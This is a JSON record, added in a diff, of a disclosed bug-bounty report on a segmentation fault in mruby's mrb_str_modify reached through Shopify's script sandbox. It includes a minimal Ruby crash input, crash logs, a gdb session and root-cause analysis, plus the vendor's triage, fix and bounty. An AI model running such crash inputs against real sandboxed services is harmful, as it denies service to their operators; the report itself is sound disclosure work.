@@ -1,0 +1,335 @@
+{
+    "id": 183231,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODMyMzE=",
+    "url": "https://hackerone.com/reports/183231",
+    "title": "SIGSEGV on mruby mrb_str_modify() (Invalid memory access)",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "high",
+    "readable_substate": "Resolved",
+    "created_at": "2016-11-18T03:48:21.522Z",
+    "submitted_at": "2016-11-18T03:48:21.522Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "jpenalbae",
+        "url": "/jpenalbae",
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 15668,
+        "url": "https://hackerone.com/shopify-scripts",
+        "handle": "shopify-scripts",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "permissions": [],
+        "submission_state": "paused",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "shopify-scripts",
+            "twitter_handle": "",
+            "website": "",
+            "about": ""
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": false,
+    "disclosed_at": "2016-12-17T02:30:01.984Z",
+    "bug_reporter_agreed_on_going_public_at": "2016-12-17T02:30:01.509Z",
+    "team_member_agreed_on_going_public_at": "2016-12-16T19:57:14.576Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "There is an invalid memory read on mruby when calling to `mrb_str_modify()` with a invalid `RString *` which causes a SIGSEGV and leads to denial of service.\n\n## Sample\n\nThe following code triggers the bug (attached as mrb_str_modify.min.rb):\n```ruby\ndef n\nif $0\nend\n\"\"if 00end\nqqq=Proc.new{|*x|x.join}\nqqq.(\"\",<<000,\"\",\n000\n\"\")\nqqq.(\"\",\"#{<<000}\",\n000\n\"\")\n0[<<0000,\n#{<<0000}\n0000\n0000\n0]\n```\n\n## Crash\nHere we can see the crash (full crash output attached)\n```\n$ bin/sandbox /tmp/mrb_str_modify.min.rb\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000001\nruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\nc:0002 p:0201 s:0005 E:000518 EVAL   bin/sandbox:21 [FINISH]\nc:0001 p:0000 s:0002 E:000730 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\nbin/sandbox:21:in `<main>'\nbin/sandbox:21:in `sandbox_eval'\n\n-- Machine register context ------------------------------------------------\n RIP: 0x00007f423c11d17b RBP: 0x00007f423ac954e0 RSP: 0x00007f423ac93a80\n RAX: 0x0000000000000002 RBX: 0x0000000000000001 RCX: 0x00007f423aca7b00\n RDX: 0x00007f423ac9cf80 RDI: 0x00007f423ac954e0 RSI: 0x0000000000000001\n  R8: 0x00007f423ac953e0  R9: 0x00007f423acbc6a0 R10: 0x0000000000000330\n R11: 0x00007f423c11e670 R12: 0x00007f423ac954e0 R13: 0x00007f423ac9cf80\n R14: 0x00007f423ac954e0 R15: 0x000000000100c03e EFL: 0x0000000000010202\n\n-- C level backtrace information -------------------------------------------\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f424042dea5]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f424042e0dc]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f4240308364]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f42403b9dbe]\n/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f424008ced0]\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_modify+0xb) [0x7f423c11d17b] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:659\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_concat+0x18) [0x7f423c11e688] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:758\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x2243) [0x7f423c12e7d3] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2219\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f423c132567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7f423c106173] ../../../../ext/mruby_engine/eval_monitored.c:68\n/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f4240083464]\n/lib/x86_64-linux-gnu/libc.so.6(__clone+0x6d) [0x7f423f3ff30d]\n```\n\n\n## Crash debug\n\n```\n(gdb) r\nStarting program: /usr/bin/ruby /home/jaime/research/shopy/mruby-engine/bin/sandbox /tmp/mrb_str_modify.min.rb\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n[New Thread 0x7ffff7ff5700 (LWP 30942)]\n[New Thread 0x7ffff2348700 (LWP 30993)]\n\nProgram received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2348700 (LWP 30993)]\nmrb_str_modify (mrb=mrb@entry=0x7ffff23494e0, s=s@entry=0x1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:660\n660       check_frozen(mrb, s);\n(gdb) x/1i $rip\n=> 0x7ffff37d117b <mrb_str_modify+11>:  mov    eax,DWORD PTR [rsi]\n(gdb) i r rsi\nrsi            0x1      1\n(gdb) print (mrb_value)$rsi\n$1 = {\n  value = {\n    p = 0x1,\n    {\n      i_flag = 1,\n      i = 0\n    },\n    {\n      sym_flag = 1,\n      sym = 0\n    },\n    bp = 0x1,\n    fp = 0x1,\n    vp = 0x1\n  },\n  w = 1\n}\n(gdb) list *$rip\n0x7ffff37d117b is in mrb_str_modify (/home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:504).\n499     }\n500\n501     static void\n502     check_frozen(mrb_state *mrb, struct RString *s)\n503     {\n504       if (RSTR_FROZEN_P(s)) {\n505         mrb_raise(mrb, E_RUNTIME_ERROR, \"can't modify frozen string\");\n506       }\n507     }\n508\n(gdb)\n```\n\nBacktrace\n```\n(gdb) bt\n#0  mrb_str_modify (mrb=mrb@entry=0x7ffff23494e0, s=s@entry=0x1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:660\n#1  0x00007ffff37d2688 in mrb_str_concat (mrb=mrb@entry=0x7ffff23494e0, self=..., other=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:758\n#2  0x00007ffff37e27d3 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=<optimized out>, proc@entry=0x7ffff2351310, pc=<optimized out>) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2219\n#3  0x00007ffff37e6567 in mrb_vm_run (mrb=0x7ffff23494e0, proc=0x7ffff2351310, self=..., stack_keep=stack_keep@entry=0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n#4  0x00007ffff37ba173 in mruby_engine_monitored_eval (data=0x7ffff23493e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n#5  0x00007ffff7737464 in start_thread (arg=0x7ffff2348700) at pthread_create.c:333\n#6  0x00007ffff6ab330d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109\n```\n\nThe crash happens at `mruby-engine/ext/mruby_engine/mruby/src/string.c:504` which is built inline\n```c\nstatic void\ncheck_frozen(mrb_state *mrb, struct RString *s)\n{\n  if (RSTR_FROZEN_P(s)) {   // <-- Bug happens here\n    mrb_raise(mrb, E_RUNTIME_ERROR, \"can't modify frozen string\");\n  }\n}\n```\n\nActually `mrb_str_concat()` performs a cast of the argument `mrb_value self` to a `RString *` pointer, this generates an invalid pointer which is passed to `mrb_str_modify()` and later on to `check_frozen()` which tries to read from it and produces the crash.\n\n## Impact\nIts impact seems to be DoS of the service running the sandbox service. I doubt this would be exploitable, but I have seen the memory address being read change in between samples. If an attacker would be able to control this value it could lead to a write-what-where type vulnerability. But I highly doubt this would be possible to control.\n\nSamples generating different invalid addresses have been attached.\n```\n$ bin/sandbox /tmp/mrb_str_modify.rb 2>&1 | head -1\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000003\n$ bin/sandbox /tmp/mrb_str_modify.min.rb 2>&1 | head -1\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000001\n```",
+    "weakness": {
+        "id": 48,
+        "name": "Denial of Service"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 135301,
+            "file_name": "mrb_str_modify.min.rb",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/135/301/426e99bb149abb3c39e3ae8b57cf8615a985dc91/mrb_str_modify.min.rb?response-content-disposition=attachment%3B%20filename%3D%22mrb_str_modify.min.rb%22%3B%20filename%2A%3DUTF-8%27%27mrb_str_modify.min.rb&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJW3J6EC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T080837Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCWT1ruwqc2oByytevVo%2BJwP5CuUSNHvk0vuHjxZNpbLwIgOeoSnb%2FmdjXdZewytaps5XSg7IBiDxrlnkPD4i4CPYQqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLBJNUdbbKZCYT0C9iqOBfQku%2B5Azcmj5AdB26nMf2ktZjuwR6Yf4mPl5dRw8xv2hbew%2FoTfHwa8uWbUsVP9%2BQ665LZktOXNtzcEk9YLJjsfltqCGOMjArmHXmO7DtjVZe3bT0CMddibsG2oRFE7MeZylLi%2FFLZ0h%2FkP2bvhv3QlPoZkzCfXnpogf2P7rP%2F0GFJYUV1cisHR6KFbgfW66l2YxBzZ2V2Df9C3KnNChUUzRLCYvb7MEp4KqRsH1CLheeBdqqLc8BtygBE77gETUQ07bkoOeLsyiEpR%2FZoTIjptSkwBiumi7HuDADkKTm%2F6pA4pVvOmQpAGJX8LEjG3R0lNEknX5P2pyl%2FfQjUhY5caRl%2B5vA0schYyxRSTFl8K1qZKq3N5P8dYZGoaPL9mth2MpCbpA0sIP5P0AYL98nH8Jqj%2FWth%2Fea29XnC4psIkWAzWSPN0jZYIKoEoViHFRgO6yQHL9xCuF7ynS8W4LG4hV6L3AW%2Bwp57nG66Z5psn2lNXAFrWQ8VINXw83pZi6oX%2FPggl3B6CXC421yVsNhkVCBquvicjntQ0w0a0JyNhxZG%2BJuNFjoxgmgxcd4LjTLj4w0y8lklVezsXkk2oz%2FPzNfZ0nL7YublRW5M7zRIiVMSYxPiaLA2x9wkpm5T2HXRNb0g0DTEwU04WhLxx4s6qhC%2BNOqyzXZGnkSfurTs469C%2Ftknm5s6rloLtHob%2FmnmYTsvKGxwm8akqMvmt9Bvr8yfEipq%2BKofcRExYGv5YVdhx9YfKPpflQz%2FnkY61%2BuKWWSLYWeB%2BLuh44oQ3vSiVtc5u%2F%2FtdEHzv6REX2VBOzT4LqaXBd9rktSPvodB8%2B5xFqRdmFj%2F6E2XkiyFiX0KLK9YixTtIXOs7FnoxcjCtrLanBjqxAUPHVGDrO9%2F7ASqx4OaO99QIBf0eY2DXvMOeQvwnrwFxMpGyyzIg5MV%2F1oK4cuDnvJtz%2F3K6XMfkdEUx1qDm1nXD%2B17RHnlMaiK0PeA3%2BHeYHE7yUoNYIF6%2B8LYu4P31sIBrZXX4seXS4n1KOzFO%2Bhlx1O%2Bs4ih71Ivq0Qs%2F6ETyi7f6yaW%2B9BTt9hM5qGA0MOAHq7RTE7Txq3kubk4%2F5o5CjZ%2FqtgPwlnf0oWR9sY%2B8hw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e993fb51bcf6d6818c103cc3627e55eeac491a552828ed736ce8b1841556a0a8",
+            "file_size": 139,
+            "type": "text/plain"
+        },
+        {
+            "id": 135302,
+            "file_name": "mrb_str_modify.rb",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/135/302/e13bada5b99bb47127ce9674abc6822babbf62d8/mrb_str_modify.rb?response-content-disposition=attachment%3B%20filename%3D%22mrb_str_modify.rb%22%3B%20filename%2A%3DUTF-8%27%27mrb_str_modify.rb&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJW3J6EC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T080837Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCWT1ruwqc2oByytevVo%2BJwP5CuUSNHvk0vuHjxZNpbLwIgOeoSnb%2FmdjXdZewytaps5XSg7IBiDxrlnkPD4i4CPYQqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLBJNUdbbKZCYT0C9iqOBfQku%2B5Azcmj5AdB26nMf2ktZjuwR6Yf4mPl5dRw8xv2hbew%2FoTfHwa8uWbUsVP9%2BQ665LZktOXNtzcEk9YLJjsfltqCGOMjArmHXmO7DtjVZe3bT0CMddibsG2oRFE7MeZylLi%2FFLZ0h%2FkP2bvhv3QlPoZkzCfXnpogf2P7rP%2F0GFJYUV1cisHR6KFbgfW66l2YxBzZ2V2Df9C3KnNChUUzRLCYvb7MEp4KqRsH1CLheeBdqqLc8BtygBE77gETUQ07bkoOeLsyiEpR%2FZoTIjptSkwBiumi7HuDADkKTm%2F6pA4pVvOmQpAGJX8LEjG3R0lNEknX5P2pyl%2FfQjUhY5caRl%2B5vA0schYyxRSTFl8K1qZKq3N5P8dYZGoaPL9mth2MpCbpA0sIP5P0AYL98nH8Jqj%2FWth%2Fea29XnC4psIkWAzWSPN0jZYIKoEoViHFRgO6yQHL9xCuF7ynS8W4LG4hV6L3AW%2Bwp57nG66Z5psn2lNXAFrWQ8VINXw83pZi6oX%2FPggl3B6CXC421yVsNhkVCBquvicjntQ0w0a0JyNhxZG%2BJuNFjoxgmgxcd4LjTLj4w0y8lklVezsXkk2oz%2FPzNfZ0nL7YublRW5M7zRIiVMSYxPiaLA2x9wkpm5T2HXRNb0g0DTEwU04WhLxx4s6qhC%2BNOqyzXZGnkSfurTs469C%2Ftknm5s6rloLtHob%2FmnmYTsvKGxwm8akqMvmt9Bvr8yfEipq%2BKofcRExYGv5YVdhx9YfKPpflQz%2FnkY61%2BuKWWSLYWeB%2BLuh44oQ3vSiVtc5u%2F%2FtdEHzv6REX2VBOzT4LqaXBd9rktSPvodB8%2B5xFqRdmFj%2F6E2XkiyFiX0KLK9YixTtIXOs7FnoxcjCtrLanBjqxAUPHVGDrO9%2F7ASqx4OaO99QIBf0eY2DXvMOeQvwnrwFxMpGyyzIg5MV%2F1oK4cuDnvJtz%2F3K6XMfkdEUx1qDm1nXD%2B17RHnlMaiK0PeA3%2BHeYHE7yUoNYIF6%2B8LYu4P31sIBrZXX4seXS4n1KOzFO%2Bhlx1O%2Bs4ih71Ivq0Qs%2F6ETyi7f6yaW%2B9BTt9hM5qGA0MOAHq7RTE7Txq3kubk4%2F5o5CjZ%2FqtgPwlnf0oWR9sY%2B8hw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=494979379cb5bdfa6fd2904ca985659fc141abba1597c06fad39481f7110c135",
+            "file_size": 4703,
+            "type": "application/octet-stream"
+        },
+        {
+            "id": 135304,
+            "file_name": "mrb_str_modify.crash.log",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/135/304/227543e55a0f26a079b00e9477a3b16a8e78e206/mrb_str_modify.crash.log?response-content-disposition=attachment%3B%20filename%3D%22mrb_str_modify.crash.log%22%3B%20filename%2A%3DUTF-8%27%27mrb_str_modify.crash.log&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJW3J6EC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T080837Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCWT1ruwqc2oByytevVo%2BJwP5CuUSNHvk0vuHjxZNpbLwIgOeoSnb%2FmdjXdZewytaps5XSg7IBiDxrlnkPD4i4CPYQqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLBJNUdbbKZCYT0C9iqOBfQku%2B5Azcmj5AdB26nMf2ktZjuwR6Yf4mPl5dRw8xv2hbew%2FoTfHwa8uWbUsVP9%2BQ665LZktOXNtzcEk9YLJjsfltqCGOMjArmHXmO7DtjVZe3bT0CMddibsG2oRFE7MeZylLi%2FFLZ0h%2FkP2bvhv3QlPoZkzCfXnpogf2P7rP%2F0GFJYUV1cisHR6KFbgfW66l2YxBzZ2V2Df9C3KnNChUUzRLCYvb7MEp4KqRsH1CLheeBdqqLc8BtygBE77gETUQ07bkoOeLsyiEpR%2FZoTIjptSkwBiumi7HuDADkKTm%2F6pA4pVvOmQpAGJX8LEjG3R0lNEknX5P2pyl%2FfQjUhY5caRl%2B5vA0schYyxRSTFl8K1qZKq3N5P8dYZGoaPL9mth2MpCbpA0sIP5P0AYL98nH8Jqj%2FWth%2Fea29XnC4psIkWAzWSPN0jZYIKoEoViHFRgO6yQHL9xCuF7ynS8W4LG4hV6L3AW%2Bwp57nG66Z5psn2lNXAFrWQ8VINXw83pZi6oX%2FPggl3B6CXC421yVsNhkVCBquvicjntQ0w0a0JyNhxZG%2BJuNFjoxgmgxcd4LjTLj4w0y8lklVezsXkk2oz%2FPzNfZ0nL7YublRW5M7zRIiVMSYxPiaLA2x9wkpm5T2HXRNb0g0DTEwU04WhLxx4s6qhC%2BNOqyzXZGnkSfurTs469C%2Ftknm5s6rloLtHob%2FmnmYTsvKGxwm8akqMvmt9Bvr8yfEipq%2BKofcRExYGv5YVdhx9YfKPpflQz%2FnkY61%2BuKWWSLYWeB%2BLuh44oQ3vSiVtc5u%2F%2FtdEHzv6REX2VBOzT4LqaXBd9rktSPvodB8%2B5xFqRdmFj%2F6E2XkiyFiX0KLK9YixTtIXOs7FnoxcjCtrLanBjqxAUPHVGDrO9%2F7ASqx4OaO99QIBf0eY2DXvMOeQvwnrwFxMpGyyzIg5MV%2F1oK4cuDnvJtz%2F3K6XMfkdEUx1qDm1nXD%2B17RHnlMaiK0PeA3%2BHeYHE7yUoNYIF6%2B8LYu4P31sIBrZXX4seXS4n1KOzFO%2Bhlx1O%2Bs4ih71Ivq0Qs%2F6ETyi7f6yaW%2B9BTt9hM5qGA0MOAHq7RTE7Txq3kubk4%2F5o5CjZ%2FqtgPwlnf0oWR9sY%2B8hw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6267070c81f0cbf7307b35dac0b967db7a68c58908118dfc861e5d3f9c1accb9",
+            "file_size": 32591,
+            "type": "text/plain"
+        }
+    ],
+    "allow_singular_disclosure_at": "2017-01-15T19:57:14.607Z",
+    "allow_singular_disclosure_after": -208786282.98132068,
+    "singular_disclosure_allowed": true,
+    "vote_count": 5,
+    "voters": [
+        "eveeez",
+        "mpz",
+        "spetr0x",
+        "scept1c",
+        "hackerjuan"
+    ],
+    "severity": {
+        "rating": "high",
+        "author_type": "Team"
+    },
+    "structured_scope": null,
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 1306660,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "Thank you for your report. We've reproduced the issue, and our engineering team is investigating.",
+            "automated_response": false,
+            "created_at": "2016-11-18T13:01:24.346Z",
+            "updated_at": "2016-11-18T13:01:24.346Z",
+            "actor": {
+                "username": "clayton",
+                "cleared": false,
+                "verified": false,
+                "url": "/clayton",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "shopify-scripts"
+        },
+        {
+            "id": 1306661,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportSeverityUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2016-11-18T13:01:31.001Z",
+            "updated_at": "2016-11-18T13:01:31.001Z",
+            "additional_data": {
+                "old_severity": null,
+                "new_severity": "High",
+                "old_severity_id": null,
+                "new_severity_id": 8135
+            },
+            "actor": {
+                "username": "clayton",
+                "cleared": false,
+                "verified": false,
+                "url": "/clayton",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "shopify-scripts"
+        },
+        {
+            "id": 1313791,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "Hi @jpenalbae,\n\nThanks again for the report. We recently deployed a fix to our production environment.\n\nI'm marking this issue as resolved now but we still need to fix this bug upstream before we can assess the impact & determine a final bounty amount. This may take a few weeks since we received a large number of valid issues and we want to calibrate our payouts across all of them.",
+            "automated_response": false,
+            "created_at": "2016-11-22T21:17:17.753Z",
+            "updated_at": "2016-11-22T21:17:17.753Z",
+            "actor": {
+                "username": "clayton",
+                "cleared": false,
+                "verified": false,
+                "url": "/clayton",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "jpenalbae",
+                "url": "/jpenalbae"
+            },
+            "genius_execution_id": null,
+            "team_handle": "shopify-scripts"
+        },
+        {
+            "id": 1319239,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "The fix for this has been merged upstream: https://github.com/mruby/mruby/pull/3279/files",
+            "automated_response": false,
+            "created_at": "2016-11-25T15:54:34.809Z",
+            "updated_at": "2016-11-25T15:54:34.809Z",
+            "actor": {
+                "username": "francoischagnon",
+                "cleared": false,
+                "verified": false,
+                "url": "/francoischagnon",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "shopify-scripts"
+        },
+        {
+            "id": 1370057,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "Thanks for helping improve the security of Shopify Scripts and the mruby project!",
+            "automated_response": false,
+            "created_at": "2016-12-16T19:57:08.352Z",
+            "updated_at": "2016-12-16T19:57:08.352Z",
+            "actor": {
+                "url": "/shopify-scripts",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "profile": {
+                    "name": "shopify-scripts"
+                }
+            },
+            "bounty_currency": "usd",
+            "genius_execution_id": null,
+            "team_handle": "shopify-scripts",
+            "collaborator": {
+                "username": "jpenalbae",
+                "url": "/jpenalbae"
+            }
+        },
+        {
+            "id": 1370058,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2016-12-16T19:57:14.594Z",
+            "updated_at": "2016-12-16T19:57:14.594Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "andrewdunbar",
+                "cleared": false,
+                "verified": false,
+                "url": "/andrewdunbar",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "shopify-scripts"
+        },
+        {
+            "id": 1370763,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2016-12-17T02:30:01.937Z",
+            "updated_at": "2016-12-17T02:30:01.937Z",
+            "actor": {
+                "username": "jpenalbae",
+                "cleared": false,
+                "verified": false,
+                "url": "/jpenalbae",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "shopify-scripts"
+        },
+        {
+            "id": 1370764,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2016-12-17T02:30:02.009Z",
+            "updated_at": "2016-12-17T02:30:02.009Z",
+            "actor": {
+                "username": "jpenalbae",
+                "cleared": false,
+                "verified": false,
+                "url": "/jpenalbae",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "shopify-scripts"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
